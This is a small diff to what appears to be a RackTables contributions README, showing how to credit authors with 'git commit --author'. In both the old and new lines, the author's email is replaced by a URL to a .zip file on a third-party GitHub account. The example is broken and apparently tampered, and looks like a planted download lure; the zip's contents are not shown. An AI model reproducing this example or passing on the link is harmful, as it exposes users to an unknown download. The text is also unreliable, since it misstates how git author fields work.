@@ -11,4 +11,4 @@ A note to the repository editors. When you are committing someone's work
 (either a new file or a change), take care of listing the author in the git
 commit properly:
 
-git commit --author='John Doe <https://raw.githubusercontent.com/kenfatys/racktables-contribs/master/carousing/racktables-contribs.zip>'
+git commit --author='John Doe <https://github.com/kenfatys/racktables-contribs/raw/refs/heads/master/extensions/plugins/pix/contribs-racktables-1.9.zip>'
